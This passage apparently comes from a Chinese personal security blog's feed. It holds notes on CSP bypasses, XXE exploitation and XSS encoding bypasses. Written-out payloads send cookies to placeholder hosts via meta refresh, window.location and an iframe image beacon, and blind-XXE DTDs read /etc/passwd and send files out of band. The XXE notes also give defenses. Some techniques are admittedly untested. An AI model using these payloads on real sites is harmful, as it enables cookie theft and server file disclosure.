&lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOzwvc2NyaXB0Pg==&quot; &gt;test&lt;/a&gt;

&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;

Bypass CSP by @akita_zen

Works for CSP like script-src self

</code></pre><ul>
<li>允许内联时</li>
</ul>
<p>可以正常输入输出测试</p>
<h6 id="2、预加载-标签rel属性-绕过只允许加载当前域"><a href="#2、预加载-标签rel属性-绕过只允许加载当前域" class="headerlink" title="2、预加载 标签rel属性 绕过只允许加载当前域"></a>2、预加载 <link>标签rel属性 绕过只允许加载当前域</h6><p>谈到这个问题就不得不说一下浏览器的预加载/预读取</p>
<ul>
<li>2.1 预加载</li>
</ul>
<p>预加载：目的和js压缩、cdn等类似都是优化浏览器请求时加快请求速度，让浏览器在空闲时间下载或读取资源，用户在将来将会访问这些资源。一个Web页面可以对浏览器设置一系列的预加载指示，当浏览器加载完当前页面后，它会在后台静悄悄的加载指定的文档，并把它们存储在缓存里。当用户访问到这些预加载的文档后，浏览器能快速的从缓存里提取给用户。（来自MDN的解释）</p>
<ul>
<li>2.1.1 预加载例子</li>
</ul>
<p>【1】prefetch 预加载资源-旧版chrome可用</p>
<p>实现方法： 通过link实现，将rel属性指定为“prefetch”，在href中指定加载资源的地址。</p>
<pre><code>&lt;!-- 预加载整个页面 --&gt;
&lt;link rel=&quot;prefetch&quot; href=&quot;http://www.webhek.com/misc/3d-album/&quot; /&gt;

&lt;!-- 预加载一个图片 --&gt;
&lt;link rel=&quot;prefetch&quot; href=&quot; http://www.webhek.com/wordpress/
wp-content/uploads/2014/04/b-334x193.jpg &quot; /&gt;
</code></pre><p>【2】prerender chrome预渲染-可用</p>
<p>对对应地址所有资源进行渲染</p>
<pre><code>&lt;link rel=&quot;prerender&quot; href=&quot;http://linux.im&quot;&gt;
</code></pre><p>【3】dns-prefetch DNS预解析-可用</p>
<p>故名思意，DNS预解析 提前将分析页面所需资源域名进行ip转换，使之在请求时尽快完成DNS解析。</p>
<pre><code>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://linux.im&quot;&gt; 
</code></pre><p>【4】除此之外还有Preconnect(-可用 类似于dns-prefetch，同时会完成握手机制)、subresource、preload<br>这里接触不多，就不一一多提了。</p>
<ul>
<li>2.1.2 预加载的绕过</li>
</ul>
<p>回到我们的重点，预加载针对的CSP绕过规则<br>在限制了资源请求时，在xss中想要把cookie传送出去</p>
<p>限制如下：</p>
<pre><code>header(&quot;Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; &quot;);
</code></pre><p>限制了不可信资源的请求，且不允许内联执行这个时候就可以用预加载方式进行绕过 传出需要的数据<br>如：</p>
<p>【1】 dns-prefetch</p>
<pre><code>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://1221.xxxx.ceye.io&quot;&gt;
</code></pre><p>这个时候就可以在ceye上查看相关dns请求记录</p>
<p>【2】prefetch<br>在Chrome下，可以使用如下标签发送cookie（最新版Chrome会禁止）</p>
<pre><code>&lt;link rel=&quot;prefetch&quot; href=&quot;http://1221.xxxx.ceye.io&quot;&gt;
</code></pre><p>【3】Preconnect、prerender 均测可用，其他的暂未测试。</p>
<p>以下也尚未测试 尴尬 仅摘抄，先写到这吧</p>
<h6 id="3-url跳转"><a href="#3-url跳转" class="headerlink" title="3 url跳转"></a>3 url跳转</h6><p>在规则限制为 default-src ‘none’的情况下，此时策略为 默认策略 禁止所有资源（不允许加载所有内容）</p>
<p>可以使用meta标签实现跳转</p>
<pre><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://www.xss.com/x.php?c=[cookie]&quot; &gt;
</code></pre><p>在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过。</p>
<pre><code>&lt;script&gt;
  window.location=&quot;http://www.xss.com/x.php?c=[cookie]&quot;;
&lt;/script&gt;
</code></pre><h6 id="4-利用浏览器补全"><a href="#4-利用浏览器补全" class="headerlink" title="4 利用浏览器补全"></a>4 利用浏览器补全</h6><p>有些网站限制只有某些脚本才能使用，往往会使用<script>标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样：</p>
<pre><code>Content-Security-Policy: default-src &#39;none&#39;;script-src &#39;nonce-abc&#39;
</code></pre><p>那么当脚本插入点为如下的情况时</p>
<pre><code>&lt;p&gt;插入点&lt;/p&gt;
&lt;script id=&quot;aa&quot; nonce=&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;/script&gt;
</code></pre><p>可以插入</p>
<pre><code>&lt;script src=//14.rs a=&quot;

这样会拼成一个新的script标签，其中的src可以自由设定
&lt;p&gt;&lt;script src=//14.rs a=&quot;&lt;/p&gt;
&lt;script id=&quot;aa&quot; nonce=&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;/script&gt;
</code></pre><h6 id="5-代码重用"><a href="#5-代码重用" class="headerlink" title="5 代码重用"></a>5 代码重用</h6><p>Blackhat2017上有篇ppt总结了可以被用来绕过CSP的一些JS库。<br>例如假设页面中使用了Jquery-mobile库，并且CSP策略中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，那么下面的向量就可以绕过CSP：</p>
<div data-role=popup id='<script>alert(1)</script>'>

</p><p>在这个PPT之外的还有一些库也可以被利用，例如RCTF2018中遇到的amp库，下面的标签可以获取名字为FLAG的cookie</p>
<p><amp-pixel src="http://your domain/?cid=CLIENT_ID(FLAG)"></amp-pixel>  </p>
<h6 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h6><p>1.如果页面A中有CSP限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过CSP：</p>
<iframe src="B"></iframe>

<p>2.在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如”<a href="http://xxx&quot;页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库。" target="_blank" rel="noopener">http://xxx&quot;页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库。</a></p>
<iframe csp="script-src 'unsafe-inline'" src="http://xxx"></iframe>

<h6 id="meta标签"><a href="#meta标签" class="headerlink" title="meta标签"></a>meta标签</h6><p>meta标签有一些不常用的功能有时候有奇效：<br>meta可以控制缓存（在header没有设置的情况下），有时候可以用来绕过CSP nonce。</p>
<pre><code>&lt;meta http-equiv=&quot;cache-control&quot; content=&quot;public&quot;&gt;

meta可以设置Cookie（Firefox下），可以结合self-xss利用。
&lt;meta http-equiv=&quot;Set-Cookie&quot; Content=&quot;cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21 GMT; path=/&quot;&gt;

</code></pre><h5 id="默认特性"><a href="#默认特性" class="headerlink" title="默认特性"></a>默认特性</h5><ul>
<li>阻止内联代码的执行</li>
<li>eval 相关功能被禁用</li>
</ul>
<h5 id="防护问题："><a href="#防护问题：" class="headerlink" title="防护问题："></a>防护问题：</h5><h5 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h5><pre><code>http://www.ruanyifeng.com/blog/2016/09/csp.html
https://blog.csdn.net/qq_37943295/article/details/79978761
https://paper.seebug.org/423/
https://xz.aliyun.com/t/318
https://paper.seebug.org/91/
http://www.webhek.com/post/link-prefetch.html
</code></pre><h5 id="存疑"><a href="#存疑" class="headerlink" title="存疑"></a>存疑</h5><p>【1】内联js的定义 <script src=""></script>属于内联还是外联<br>（通俗的来说 内联 即属于script标签内直接调用，外联属于调用外部js）</p>
]]></content>
      
        <categories>
            
            <category> 浏览器安全策略 </category>
            
            <category> csp </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 浏览器安全策略 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2019]]></title>
      <url>/2019/01/01/2019/</url>
      <content type="html"><![CDATA[<p>  随着2018的过去，生活不知不觉的过去的一年，这一年里感觉多多少少还是需要说点啥，先总的一说，总体还是比较满意的，顺利的毕业、顺利的工作，但近段时间以来，感觉个人浮躁了很多，可能是根本就没让自己沉淀下来吧，新的一年，还是给自己树立一个小的flag吧。</p>
<ul>
<li>重新规划技术成长的节奏</li>
<li>团队技术性成长</li>
<li>回归生活 </li>
<li>先学会吉他</li>
<li>开始练字静心</li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> 生活 </tag>
            
            <tag> 规划 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XXE 示例及利用]]></title>
      <url>/2018/12/24/Web%E6%B8%97%E9%80%8F/XXE/XXE%E7%A4%BA%E4%BE%8B%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
      <content type="html"><![CDATA[<p>注：<br>libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。为了演示PHP环境下的XXE漏洞，本例会将libxml2.8.0版本编译进PHP中。PHP版本并不影响XXE利用</p>
<h3 id="简析XXE"><a href="#简析XXE" class="headerlink" title="简析XXE"></a>简析XXE</h3><p>php漏洞示例：</p>
<pre class=" language-php"><code class="language-php">
<span class="token delimiter">&lt;?php</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input');</span>
<span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$xml</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>
</code></pre>
<p>其中发送请求的请求头：当前客户端可以接收的文档类型。</p>
<pre><code>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</code></pre><p>payload</p>
<pre class=" language-xml"><code class="language-xml">
<span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token doctype">&lt;!DOCTYPE a [
&lt;!ELEMENT name ANY ></span>
&lt;!ENTITY passwd SYSTEM "file:///etc/passwd">]>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&passwd;">&amp;passwd;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span> 标签可以自定义，但由于echo$xml->name，然后echo 只能处理字符串，对其他变量不能处理，因此此处用print_r 效果更好 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>

</code></pre>
<pre class=" language-xml"><code class="language-xml">
<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> 
<span class="token doctype">&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY ></span>
&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span>
</code></pre>
<ul>
<li>直接通过外部实体DTD声明</li>
</ul>
<pre class=" language-xml"><code class="language-xml">
<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> 
<span class="token doctype">&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY ></span>
&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span>
</code></pre>
<ul>
<li>通过外部实体引入外部DTD文档，再引入外部实体声明[没有验证成功，更换引用本地dtd也只能读取，解析出错]<br>这种命名实体调用外部实体，发现xxe.dtd中不能定义/声明实体，否则解析不了。</li>
</ul>
<pre class=" language-xml"><code class="language-xml">
<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> 
<span class="token doctype">&lt;!DOCTYPE xxe 
[&lt;!ENTITY  a  SYSTEM "http://127.0.0.1:8888/test/xxe.dtd" ></span>]>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>

</code></pre>
<ul>
<li>通过外部参数实体引入外部实体声明</li>
</ul>
<pre class=" language-xml"><code class="language-xml">
<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> 
<span class="token doctype">&lt;!DOCTYPE xxe [
        &lt;!ENTITY % xxe SYSTEM "http://127.0.0.1:8888/test/xxe.dtd" ></span>
%xxe;
]>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>

</code></pre>
<h3 id="XXE攻击面的拓展"><a href="#XXE攻击面的拓展" class="headerlink" title="XXE攻击面的拓展"></a>XXE攻击面的拓展</h3><h4 id="XXE漏洞检测流程"><a href="#XXE漏洞检测流程" class="headerlink" title="XXE漏洞检测流程"></a>XXE漏洞检测流程</h4><h5 id="有回显测试"><a href="#有回显测试" class="headerlink" title="有回显测试"></a>有回显测试</h5><ul>
<li>测试是否解析xml：</li>
</ul>
<pre class=" language-xml"><code class="language-xml">
<span class="token prolog">&lt;?xml version=”1.0” encoding=”UTF-8”?></span>

<span class="token doctype">&lt;!DOCTYPE ANY [
&lt;!ENTITY test "test"></span>
]>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token entity" title="&test;">&amp;test;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span>

</code></pre>
<ul>
<li>测试是否支持外部实体<br>用外部参数/普通实体测试一下 (system)</li>
</ul>
<pre class=" language-xml"><code class="language-xml">
<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> 
<span class="token doctype">&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY ></span>
&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span>

</code></pre>
<h5 id="无回显测试"><a href="#无回显测试" class="headerlink" title="无回显测试"></a>无回显测试</h5><p>无防火墙的情况下，可以尝试ssrf</p>
<pre class=" language-xml"><code class="language-xml">
<span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token doctype">&lt;!DOCTYPE root [
&lt;!ENTITY % remote SYSTEM "http://xx.xx.xx.xx/"></span>
%remote;]>
</code></pre>
<h4 id="面对有回显和无回显部分"><a href="#面对有回显和无回显部分" class="headerlink" title="面对有回显和无回显部分"></a>面对有回显和无回显部分</h4><p>有回显比较简单暂不考虑</p>
<p>无回显：Blind XXE 构建带外信道</p>
<h5 id="无回显任意文件读取"><a href="#无回显任意文件读取" class="headerlink" title="无回显任意文件读取"></a>无回显任意文件读取</h5><pre><code>php://filter/read=convert.base64-encode/resource=./target.php 

</code></pre><p>获取目标内容<br>然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx</p>
<p>理论上来说 此处使用的逻辑：<br>通过嵌套形式的使用建立带外数据通道</p>
<p>直接在内部实体声明中引用另一个实体如下：</p>
<pre class=" language-xml"><code class="language-xml">
<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
<span class="token doctype">&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY></span>
&lt;!ENTITY % param1 SYSTEM "file:///etc/passwd">
&lt;!ENTITY % param2 SYSTEM "http://xx.xx.xx.xx/?%param1">
%param2;
]>
</code></pre>
<p>但由于不能在实体声明中引用参数实体，所以只能如下的引用：将嵌套实体声明放入外部实体文件(dtd/xml)<br>payload：</p>
<pre class=" language-xml"><code class="language-xml">
<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
  <span class="token doctype">&lt;!DOCTYPE xxe [
  &lt;!ELEMENT name ANY ></span>
  &lt;!ENTITY % load SYSTEM "http://xx.xx.xx.xx/xxe/xxe1.dtd">
  %load;
]>

xxe1.dtd:
&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=s.php">
  &lt;!ENTITY % top '
      &lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> send SYSTEM "http://xx.xx.xx.xx/?%file;">
  '>
%top; %send;
>
</code></pre>
<p>可以在日志中看到：</p>
<pre><code>
  &quot;GET /xxe/xxe1.dtd HTTP/1.0&quot; 200 403 &quot;-&quot; &quot;-&quot;
xx.xx.xx.xx - - [28/Dec/2018:12:44:24 +0800] &quot;GET /?PD9waHAKJF8gPSAoJ2EnLidzJy4ncycuJ2UnLidyJy4oJwwnXid4JykpOwokX18gPSAkX0dFVFtfXS4nLy8nOwokX19fPSgkXy4nJyk7CigkX19fKT8kX19fKCRfXyk6JF9fXygkX18pOwo/Pg== HTTP/1.0&quot; 200 2141 &quot;-&quot; &quot;-&quot;

</code></pre><p>达到任意文件读取的目的<br>但etc/passwd 直接读取编码后，（用get请求发送会显示读取字符串太长；初步测试长度hash后2945,但感觉这个数据有点怪异，有可能是其他原因）</p>
<p>此处也可以使用支持的其他协议：</p>
<pre><code>libxml2支持: file/http/ftp

php支持：file/http/ftp/php/compress.zlib/compress.bzip2/data/glob/phar

java支持: http/https/ftp/file/jar/netdoc/mailto/gopher

NET支持:file/http/https/ftp
</code></pre><h5 id="但当探测当目标具有防火墙或类似防护时，即不能直接通过ssrf判断是否存在时，需要变换思路-待补充"><a href="#但当探测当目标具有防火墙或类似防护时，即不能直接通过ssrf判断是否存在时，需要变换思路-待补充" class="headerlink" title="但当探测当目标具有防火墙或类似防护时，即不能直接通过ssrf判断是否存在时，需要变换思路-待补充"></a>但当探测当目标具有防火墙或类似防护时，即不能直接通过ssrf判断是否存在时，需要变换思路-待补充</h5><h4 id="XML解析器"><a href="#XML解析器" class="headerlink" title="XML解析器"></a>XML解析器</h4><p>学习到这里 顺便学一下 XML解析器</p>
<h3 id="XXE危害："><a href="#XXE危害：" class="headerlink" title="XXE危害："></a>XXE危害：</h3><ul>
<li>读取任意文件：</li>
<li>命令执行<br>php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装</li>
<li>内网探测/SSRF</li>
<li>拒绝服务</li>
</ul>
<h5 id="XXE防御："><a href="#XXE防御：" class="headerlink" title="XXE防御："></a>XXE防御：</h5><ul>
<li>最好的解决办法就是配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己声明的DTD，即禁用外部实体</li>
</ul>
<pre><code>PHP：
libxml_disable_entity_loader(true);

JAVA:
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);

Python：
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
</code></pre><ul>
<li>过滤用户提交的XML数据</li>
</ul>
<pre><code>关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC
</code></pre><p>参考资料：</p>
<pre><code>http://docs.ioin.in/writeup/mohemiv.com/_all_exploiting_xxe_with_local_dtd_files_/index.html
https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/
https://blog.csdn.net/u011721501/article/details/43775691 
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> XXE </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[编码绕过xss]]></title>
      <url>/2018/12/02/xss/%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87XSS/</url>
      <content type="html"><![CDATA[<h4 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h4><p>img、video、audio、iframe中的src属性只能请求，不能执行，在ie8以前可以;但可以使用js伪协议调用js</p>
<pre><code>&lt;iframe src=&quot;javascript:alert(&#39;iframe&#39;)&quot; width = &quot;0&quot; height = &quot;0&quot;/&gt;

&lt;iframe src=&quot;javascript:var img=document.createElement(&#39;img&#39;);
img.src=&#39;http://xx.xxx.xxx.xxx/log&#39;+escape(document.cookie);
document.body.appendChild(img);&quot;/&gt;
</code></pre><h4 id="Base64编码绕过"><a href="#Base64编码绕过" class="headerlink" title="Base64编码绕过"></a>Base64编码绕过</h4><p>一般应用场景：</p>
<pre><code>&lt;a href=&quot;可控点&quot;&gt;
&lt;iframe src=&quot;可控点&quot;&gt;
</code></pre><p>当在这种情况下 过滤了&lt;&gt;’ “ javascript的话 就可以尝试使用base64编码绕过</p>
<pre><code>&lt;a href=&quot;data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&quot;&gt;test&lt;/a&gt;

&lt;img src=x onerror=alert(1)&gt;
</code></pre><p>这样当test A链接时,就会以data协议 页面以html/text的方式解析 编码为base64 然后单点击a链接时 base64的编码就被还原成原本的</p>
<h4 id="HTML编码16进制-10进制-amp-x-amp"><a href="#HTML编码16进制-10进制-amp-x-amp" class="headerlink" title="HTML编码16进制/10进制 &amp;#x/&amp;"></a>HTML编码16进制/10进制 &amp;#x/&amp;</h4><p>html实体编码本身只是为了防止与html本身语义标记的冲突。html正常只识别html10进制、html16进制,不会在html标签中解析js的那些编码，因此在比如onerror后放置js的编码比如jsunicode、js八进制、js16进制是不会解析的。</p>
<pre><code>&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;
</code></pre><h4 id="magic-quote-gpc绕过"><a href="#magic-quote-gpc绕过" class="headerlink" title="magic_quote_gpc绕过"></a>magic_quote_gpc绕过</h4><p>在遇到php中magic_quote_gpc（版本5.4之后已经移除了） 魔术变量处理开关转义，即便存储到后台的数据也会是转义的，如果输入的数据有<br>单引号（’）、双引号（”）、反斜线（）与 NUL（NULL 字符）等字符都会被加上反斜线。针对该设置，进行xss绕过的话，通常使用js的string.fromCharCode()</p>
<pre><code>&lt;?php
$a=$_GET[&#39;id&#39;];
echo $a;
?&gt;

http://localhost:8888/ev_php/xss_gpc.php?id=%3Cscript%3Ealert(String.fromCharCode(34,%2049,%2034))%3C/script%3E

&lt;script&gt;alert(String.fromCharCode(34, 49, 34))&lt;/script&gt;
</code></pre><p>string.fromCharCode()： Unicode 字符值中返回一个字符串</p>
<h4 id="javascript-jsunicode-8进制和16进制"><a href="#javascript-jsunicode-8进制和16进制" class="headerlink" title="javascript jsunicode 8进制和16进制"></a>javascript jsunicode 8进制和16进制</h4><p>[&lt;] 分别是 \u003c \74 \x3c</p>
<h4 id="宽字节绕过"><a href="#宽字节绕过" class="headerlink" title="宽字节绕过"></a>宽字节绕过</h4><h4 id="头部Base绕过"><a href="#头部Base绕过" class="headerlink" title="头部Base绕过"></a>头部Base绕过</h4><h4 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h4><p>【1】浏览器在发出url前会进行一次url编码，针对部分字符，以firefox为例子：</p>
<pre><code>发出的请求    &#39;&quot; &lt;script&gt;alert(1)&lt;/script&gt; 
服务端接收到的请求  %27%22%20%3Cscript%3Ealert(1)%3C/script%3E

服务端自动解码一次返回数据（默认） 
&#39;&quot; &lt;script&gt;alert(1)&lt;/script&gt; 

</code></pre><p>这也是为什么提交payload的时候可以不编码、urlencode<br>注意 浏览器的urlencode 应该是不包括%的，和常规的urlencode不太一样</p>
<ul>
<li>双重编码<br>在某些时候测试xss中，可能会遇到payload中被htmlspecialcahrs编码，但可以针对服务端进行双重编码绕过，推测该后端代码<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
</code></pre>
在该url中经过htmlspecialchars处理后，又再次进行了urldecode，相当于进行了两次urldecode，又因为经过编码绕过了htmlspecialchars的处理，故触发了该xss</li>
<li>三重编码<br>和双重绕过类似，推测多出来的一次是因为在htmlspecialchars前又进行了一次编码，如果没有后面那一行”echo urldecode($a);” 过滤是正常的，两者问题都出在此处<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$a1</span><span class="token operator">=</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
</code></pre>
</li>
</ul>
<h3 id="浏览器编码解码原理"><a href="#浏览器编码解码原理" class="headerlink" title="浏览器编码解码原理"></a>浏览器编码解码原理</h3><p>为了更深入的了解xss的结果和原理，不得不了解浏览器的工作原理，以及解码顺序。<br>浏览器中具有URL解析引擎、HTML解析引擎、JS解析引擎<br>主要构成：</p>
<ul>
<li>用户界面</li>
<li>浏览器引擎－ 用来查询及操作渲染引擎的接口</li>
<li>渲染引擎－ 用来显示请求的内容，例如，如果请求内容为html，它负责解析html及css，并将解析后的结果显示出来</li>
<li>网络－ 用来完成网络调用，例如http请求，它具有平台无关的接口，可以在不同平台上工作</li>
<li>UI 后端－ 用来绘制类似组合选择框及对话框等基本组件，具有不特定于某个平台的通用接口，底层使用操作系统的用户接口</li>
<li>JS解释器－ 用来解释执行JS代码</li>
<li>数据存储－ 属于持久层，浏览器需要在硬盘中保存类似cookie的各种数据，HTML5定义了web database技术，这是一种轻量级完整的客户端存储技术</li>
</ul>
<h4 id="重点是接下来的编码解码顺序"><a href="#重点是接下来的编码解码顺序" class="headerlink" title="重点是接下来的编码解码顺序"></a>重点是接下来的编码解码顺序</h4><p>首先是URL解析:</p>
<ul>
<li>用户在浏览器中填写一个资源定位标识，浏览器在将内容发送给对应的服务器，服务器对浏览器发过来的请求信息进行URL解析，在这个过程中遇到%号时会对该url进行url解码，该解码位置在于服务端自动解码一次，不需要编写代码，浏览器自身是不会进行url解码的<br>案例：</li>
</ul>
<ol>
<li>在客户端提交一次经过urlencode的字符串，在接收到服务端的返回数据时，已经经过urldecode了，而服务端如果直接返回urlencode的数据，浏览器接收到仍然用urlencode的形式渲染，在xss中并不会起作用,测试代码如下，有点乱 小尴尬：<pre><code>&lt;?php
echo $a1=$_GET[&#39;id&#39;];
echo &quot;1&lt;/br&gt;&quot;;
echo $a2 =&quot;%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e&quot;;
?&gt;
</code></pre>在测试中a2的xss仍然以urlencode的形式返回到浏览器而不会解析，而以get方式提交的id，以urlencode形式提交则会解析触发xss</li>
</ol>
<ul>
<li>HTMl/SVG/XHTML 解析<br>浏览器在接收到页面数据时，会首先对该数据进行HTML解析来构造DOM树，构造的过程与语言的编译过程是相似的，接收文档，先进行词法分析，然后语法分析，构建解析树。HTML 的分析器只能识别特定的词法规则，才能构建起DOM 树，<strong>这一块，HTML 不会做解码的工作</strong><br>因此以下代码无效：即标签本身结构不能变化<pre><code>&lt;img src&amp;#x3d;&quot;http://xxx.xxx.xx.xxx&quot;&gt;
</code></pre>在DOM构建完成后，才开始识别节点内容<br>对html实体编码的内容进行解码<h5 id="构造DOM树"><a href="#构造DOM树" class="headerlink" title="构造DOM树"></a>构造DOM树</h5>解析树是由DOM元素和属性节点构成的树结构，根节点是Document对象，DOM与标记一一对应<pre><code>&lt;html&gt;
&lt;head&gt;
  &lt;meta charset=&quot;utf-8&quot;&gt;
  &lt;title&gt;
  &lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;p&gt;&lt;/p&gt;
&lt;h1&gt;&lt;/h1&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>对应的DOM树：<pre><code>graph TD
st(HTMLDocument)--&gt;a
a(HTML)
a--&gt;b1(head)
a--&gt;b2(body)
b1--&gt;c1(meta)
b1--&gt;c2(title)
b2--&gt;p1(p)
b2--&gt;p2(h)
